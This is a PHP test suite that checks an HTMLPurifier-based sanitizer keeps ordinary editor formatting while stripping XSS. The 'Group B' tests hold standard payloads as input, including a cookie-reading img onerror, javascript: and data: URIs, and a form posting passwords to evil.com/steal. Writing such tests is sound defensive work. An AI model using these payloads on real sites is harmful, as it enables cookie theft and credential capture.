<?php
/**
 * Test Suite EAO-103: HTMLPurifier Integration, Sanitization & Security Contract
 * 
 * Menguji:
 * Group A: Normal Summernote HTML tags & formatting preservation
 * Group B: XSS attack vectors & evasion techniques blocking
 * Group C: Fail-closed fallback verification
 * Group D: Dual-track autoloading & environment distribution verification
 */

define('APPPATH', dirname(__DIR__) . '/app/');
define('SYSTEMPATH', dirname(__DIR__) . '/system/');
define('ROOTPATH', dirname(__DIR__) . '/');
define('WRITEPATH', dirname(__DIR__) . '/writable/');
if (!defined('ENVIRONMENT')) {
    define('ENVIRONMENT', 'testing');
}

// Bootstrap CodeIgniter functions
require_once SYSTEMPATH . 'Common.php';
require_once APPPATH . 'Common.php';
require_once APPPATH . 'Libraries/HtmlSanitizer.php';

use App\Libraries\HtmlSanitizer;

$totalAssertions = 0;
$passedAssertions = 0;
$failedAssertions = [];

function assert_test(string $name, bool $condition, string $details = ''): void {
    global $totalAssertions, $passedAssertions, $failedAssertions;
    $totalAssertions++;
    if ($condition) {
        $passedAssertions++;
        echo "  [PASS] {$name}\n";
    } else {
        $failedAssertions[] = "{$name} - {$details}";
        echo "  [FAIL] {$name} - {$details}\n";
    }
}

echo "=== TEST SUITE EAO-103: HTMLPURIFIER SANITIZER & SECURITY CONTRACT ===\n\n";

// =========================================================================
// GROUP A: NORMAL HTML SUMMERNOTE CONTENT
// =========================================================================
echo "--- GROUP A: Normal HTML Summernote Elements ---\n";

// A1: Paragraph & Line breaks
$inA1 = '<p>Paragraf pertama.</p><p>Paragraf kedua.<br>Baris baru.</p>';
$outA1 = purify_html($inA1);
assert_test("A1: Paragraphs and line breaks preserved",
    str_contains($outA1, '<p>Paragraf pertama.</p>') && (str_contains($outA1, '<br>') || str_contains($outA1, '<br />')),
    "Output: " . $outA1
);

// A2: Headings h1 to h6
$inA2 = '<h1>Judul 1</h1><h2>Judul 2</h2><h3>Judul 3</h3><h4>Judul 4</h4><h5>Judul 5</h5><h6>Judul 6</h6>';
$outA2 = purify_html($inA2);
assert_test("A2: Headings h1-h6 preserved",
    str_contains($outA2, '<h1>Judul 1</h1>') && str_contains($outA2, '<h6>Judul 6</h6>'),
    "Output: " . $outA2
);

// A3: Formatting b, strong, i, em, u, s
$inA3 = '<p><b>Tebal</b> <strong>Sangat Tebal</strong> <i>Miring</i> <em>Penekanan</em> <u>Garis Bawah</u> <s>Coret</s></p>';
$outA3 = purify_html($inA3);
assert_test("A3: Text formatting tags preserved",
    str_contains($outA3, '<b>Tebal</b>') &&
    str_contains($outA3, '<strong>Sangat Tebal</strong>') &&
    str_contains($outA3, '<i>Miring</i>') &&
    str_contains($outA3, '<em>Penekanan</em>') &&
    str_contains($outA3, '<u>Garis Bawah</u>') &&
    str_contains($outA3, '<s>Coret</s>'),
    "Output: " . $outA3
);

// A4: Lists (ul, ol, li)
$inA4 = '<ul><li>Item A</li><li>Item B</li></ul><ol><li>Nomor 1</li><li>Nomor 2</li></ol>';
$outA4 = purify_html($inA4);
assert_test("A4: Ordered and unordered lists preserved",
    str_contains($outA4, '<ul><li>Item A</li>') && str_contains($outA4, '<ol><li>Nomor 1</li>'),
    "Output: " . $outA4
);

// A5: Blockquote
$inA5 = '<blockquote>Kutipan penting agenda rapat.</blockquote>';
$outA5 = purify_html($inA5);
assert_test("A5: Blockquote preserved",
    str_contains($outA5, '<blockquote>Kutipan penting agenda rapat.</blockquote>'),
    "Output: " . $outA5
);

// A6: Tables with thead, tbody, tr, th, td, colspan, rowspan, class
$inA6 = '<table class="table table-bordered"><thead><tr><th colspan="2">Header Gabung</th></tr></thead><tbody><tr><td>Data 1</td><td>Data 2</td></tr></tbody></table>';
$outA6 = purify_html($inA6);
assert_test("A6: Tables with classes and colspan preserved",
    str_contains($outA6, '<table class="table table-bordered">') &&
    str_contains($outA6, '<th colspan="2">') &&
    str_contains($outA6, '<td>Data 1</td>'),
    "Output: " . $outA6
);

// A7: Links with http/https and target="_blank" (with automatic rel noopener noreferrer)
$inA7 = '<p><a href="https://espata.sch.id/agenda" target="_blank" title="Agenda Sekolah">Web ESPATA</a></p>';
$outA7 = purify_html($inA7);
assert_test("A7: HTTPS Link with target _blank and rel noopener noreferrer preserved",
    str_contains($outA7, 'href="https://espata.sch.id/agenda"') &&
    str_contains($outA7, 'target="_blank"') &&
    (str_contains($outA7, 'rel="noreferrer noopener"') || str_contains($outA7, 'rel="noopener noreferrer"')),
    "Output: " . $outA7
);

// A8: Mailto link
$inA8 = '<p><a href="mailto:info@espata.sch.id">Kirim Email</a></p>';
$outA8 = purify_html($inA8);
assert_test("A8: Mailto link preserved",
    str_contains($outA8, 'href="mailto:info@espata.sch.id"'),
    "Output: " . $outA8
);

// =========================================================================
// GROUP B: XSS ATTACK VECTORS & ACTIVE CONTENT BLOCKING
// =========================================================================
echo "\n--- GROUP B: XSS Vectors & Active Content Blocking ---\n";

// B1: Script tag
$inB1 = '<p>Normal</p><script>alert("XSS1")</script>';
$outB1 = purify_html($inB1);
assert_test("B1: Direct <script> tag completely removed",
    !str_contains($outB1, 'script') && !str_contains($outB1, 'alert'),
    "Output: " . $outB1
);

// B2: Event handlers (onerror, onload, onclick, onmouseover)
$inB2 = '<p onclick="alert(1)">Klik</p><b onmouseover="alert(2)">Hover</b>';
$outB2 = purify_html($inB2);
assert_test("B2: Inline event handlers stripped from allowed tags",
    !str_contains($outB2, 'onclick') && !str_contains($outB2, 'onmouseover') && !str_contains($outB2, 'alert'),
    "Output: " . $outB2
);

// B3: Image with onerror (Images are not in allowlist)
$inB3 = '<img src="x" onerror="alert(document.cookie)">';
$outB3 = purify_html($inB3);
assert_test("B3: <img> tag and onerror handler stripped",
    !str_contains($outB3, '<img') && !str_contains($outB3, 'alert'),
    "Output: " . $outB3
);

// B4: Javascript pseudo-protocol in href
$inB4 = '<a href="javascript:alert(1)">Klik Saya</a>';
$outB4 = purify_html($inB4);
assert_test("B4: javascript: pseudo-protocol stripped",
    !str_contains($outB4, 'javascript:') && !str_contains($outB4, 'alert'),
    "Output: " . $outB4
);

// B5: Obfuscated javascript URI (HTML entities, tabs, whitespace)
$inB5 = '<a href="jav&#x09;ascript:alert(document.domain)">Klik</a>';
$outB5 = purify_html($inB5);
assert_test("B5: Obfuscated javascript: URI blocked",
    !str_contains($outB5, 'javascript:') && !str_contains($outB5, 'jav&#x09;ascript'),
    "Output: " . $outB5
);

// B6: Data URI scheme
$inB6 = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>';
$outB6 = purify_html($inB6);
assert_test("B6: data: URI scheme blocked",
    !str_contains($outB6, 'data:') && !str_contains($outB6, 'base64'),
    "Output: " . $outB6
);

// B7: VBScript URI
$inB7 = '<a href="vbscript:msgbox(1)">VBScript</a>';
$outB7 = purify_html($inB7);
assert_test("B7: vbscript: URI scheme blocked",
    !str_contains($outB7, 'vbscript:'),
    "Output: " . $outB7
);

// B8: Iframe tag
$inB8 = '<iframe src="https://evil.com/phishing"></iframe>';
$outB8 = purify_html($inB8);
assert_test("B8: <iframe> tag completely stripped",
    !str_contains($outB8, 'iframe'),
    "Output: " . $outB8
);

// B9: Object and embed tags
$inB9 = '<object data="test.swf"><embed src="test.swf"></embed></object>';
$outB9 = purify_html($inB9);
assert_test("B9: <object> and <embed> tags stripped",
    !str_contains($outB9, 'object') && !str_contains($outB9, 'embed'),
    "Output: " . $outB9
);

// B10: SVG with script or onload
$inB10 = '<svg onload="alert(1)"><circle r="10"/></svg>';
$outB10 = purify_html($inB10);
assert_test("B10: <svg> tag stripped",
    !str_contains($outB10, 'svg') && !str_contains($outB10, 'alert'),
    "Output: " . $outB10
);

// B11: Form and input injection
$inB11 = '<form action="https://evil.com/steal" method="POST"><input type="password" name="pwd"><button type="submit">Kirim</button></form>';
$outB11 = purify_html($inB11);
assert_test("B11: <form>, <input>, and <button> tags stripped",
    !str_contains($outB11, '<form') && !str_contains($outB11, '<input') && !str_contains($outB11, '<button'),
    "Output: " . $outB11
);

// B12: Nested malformed tags trying to bypass filters
$inB12 = '<b<script>alert(1)</script>>Teks</b>';
$outB12 = purify_html($inB12);
assert_test("B12: Nested malformed tags sanitized safely",
    !str_contains($outB12, '<script') && !str_contains($outB12, '</script>'),
    "Output: " . $outB12
);

// B13: Context escape attempt
$inB13 = '">><script>alert(1)</script><"';
$outB13 = purify_html($inB13);
assert_test("B13: Context escaping attempt sanitized",
    !str_contains($outB13, '<script>') && !str_contains($outB13, 'alert'),
    "Output: " . $outB13
);

// =========================================================================
// GROUP C: FAIL-CLOSED FALLBACK BEHAVIOR
// =========================================================================
echo "\n--- GROUP C: Fail-Closed Fallback Behavior ---\n";

// C1: Empty and null inputs
assert_test("C1a: Null input returns empty string", purify_html(null) === '', "Output: " . var_export(purify_html(null), true));
assert_test("C1b: Empty string input returns empty string", purify_html('') === '', "Output: " . var_export(purify_html(''), true));

// C2: failClosed method converts HTML entities and preserves line breaks
$dirtyContent = "<b>Pesan</b>\n<script>alert(1)</script>\nBaris 2";
$failClosedOut = HtmlSanitizer::failClosed($dirtyContent);
assert_test("C2: failClosed escapes HTML and converts newlines with nl2br",
    str_contains($failClosedOut, '&lt;b&gt;Pesan&lt;/b&gt;') &&
    str_contains($failClosedOut, '&lt;script&gt;alert(1)&lt;/script&gt;') &&
    str_contains($failClosedOut, '<br />') &&
    !str_contains($failClosedOut, '<script>'),
    "Output: " . $failClosedOut
);

// C3: No strip_tags used in failClosed
assert_test("C3: failClosed retains text content as escaped rather than discarding via strip_tags",
    str_contains($failClosedOut, '&lt;script&gt;'),
    "Output: " . $failClosedOut
);

// =========================================================================
// GROUP D: DUAL-TRACK AUTOLOADING & DISTRIBUTION INTEGRITY
// =========================================================================
echo "\n--- GROUP D: Distribution & Autoloading ---\n";

// D1: Verify loaded source
$source = HtmlSanitizer::getLoadedSource();
assert_test("D1: HTMLPurifier loaded via valid source (vendor or thirdparty)",
    $source === 'vendor' || $source === 'thirdparty',
    "Loaded source: " . var_export($source, true)
);

// D2: Verify version matches exactly 4.19.1
assert_test("D2: HTMLPurifier runtime version is exactly 4.19.1",
    defined('HTMLPurifier::VERSION') && HTMLPurifier::VERSION === '4.19.1',
    "Version: " . (defined('HTMLPurifier::VERSION') ? HTMLPurifier::VERSION : 'undefined')
);

// D3: Verify thirdparty bundle files exist
$thirdPartyBase = APPPATH . 'ThirdParty/HTMLPurifier/';
assert_test("D3a: ThirdParty library exists", is_dir($thirdPartyBase . 'library'));
assert_test("D3b: ThirdParty LICENSE exists", file_exists($thirdPartyBase . 'LICENSE'));
assert_test("D3c: ThirdParty VERSION exists and is 4.19.1",
    file_exists($thirdPartyBase . 'VERSION') && trim(file_get_contents($thirdPartyBase . 'VERSION')) === '4.19.1');
assert_test("D3d: ThirdParty CREDITS exists", file_exists($thirdPartyBase . 'CREDITS'));
assert_test("D3e: Standalone autoloader HTMLPurifier.auto.php exists", file_exists($thirdPartyBase . 'library/HTMLPurifier.auto.php'));

// D4: Test cache directory creation
$cacheDir = WRITEPATH . 'cache/htmlpurifier';
assert_test("D4: Cache directory exists in writable/", is_dir($cacheDir), "Path: " . $cacheDir);

// D5: Verify standalone ThirdParty autoloader in isolated process (simulating client without Composer)
$output = shell_exec('php tests/test_standalone_thirdparty_loading.php');
assert_test("D5: Standalone ThirdParty fallback works when vendor is absent",
    str_contains($output, 'SOURCE:thirdparty') && str_contains($output, '<p>ThirdParty Standalone Test</p>') && !str_contains($output, 'script'),
    "Subprocess output: " . var_export($output, true)
);

echo "\n=======================================================\n";
echo "TOTAL ASSERTIONS: {$totalAssertions}\n";
echo "PASSED: {$passedAssertions}\n";
echo "FAILED: " . count($failedAssertions) . "\n";
if (count($failedAssertions) > 0) {
    echo "FAILURES:\n";
    foreach ($failedAssertions as $fail) {
        echo " - {$fail}\n";
    }
}
echo "=======================================================\n";

exit(count($failedAssertions) === 0 ? 0 : 1);
